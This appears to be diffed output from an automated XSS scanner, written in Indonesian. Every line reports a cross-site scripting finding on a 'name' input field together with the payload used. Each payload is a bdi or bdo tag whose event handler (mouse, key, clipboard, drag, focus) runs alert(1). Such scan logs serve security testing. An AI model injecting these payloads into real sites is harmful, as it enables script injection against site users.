+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi oncontextmenu="alert(1)">test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi oncopy="alert(1)" contenteditable>test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi oncut="alert(1)" contenteditable>test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi ondblclick="alert(1)">test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onfocusout=alert(1) tabindex=1 id=x></bdi><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onkeydown="alert(1)" contenteditable>test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onkeypress="alert(1)" contenteditable>test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onkeyup="alert(1)" contenteditable>test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onmousedown="alert(1)">test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onmouseenter="alert(1)">test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onmouseleave="alert(1)">test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onmousemove="alert(1)">test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onmouseout="alert(1)">test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onmouseover="alert(1)">test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onmouseup="alert(1)">test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onpaste="alert(1)" contenteditable>test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo draggable="true" ondrag="alert(1)">test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo draggable="true" ondragend="alert(1)">test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo draggable="true" ondragenter="alert(1)">test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo draggable="true" ondragleave="alert(1)">test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo draggable="true" ondragstart="alert(1)">test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo id=x tabindex=1 onactivate=alert(1)></bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo id=x tabindex=1 onbeforedeactivate=alert(1)></bdo><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo id=x tabindex=1 onfocus=alert(1)></bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo id=x tabindex=1 onfocusin=alert(1)></bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo onbeforecopy="alert(1)" contenteditable>test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo onbeforecut="alert(1)" contenteditable>test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo onbeforepaste="alert(1)" contenteditable>test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo onblur=alert(1) tabindex=1 id=x></bdo><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo onclick="alert(1)">test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo oncontextmenu="alert(1)">test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo oncopy="alert(1)" contenteditable>test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo oncut="alert(1)" contenteditable>test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo ondblclick="alert(1)">test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo onkeydown="alert(1)" contenteditable>test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo onkeypress="alert(1)" contenteditable>test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo onkeyup="alert(1)" contenteditable>test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo onmousedown="alert(1)">test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo onmouseenter="alert(1)">test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo onmouseleave="alert(1)">test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo onmousemove="alert(1)">test</bdo>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdo onmouseout="alert(1)">test</bdo>
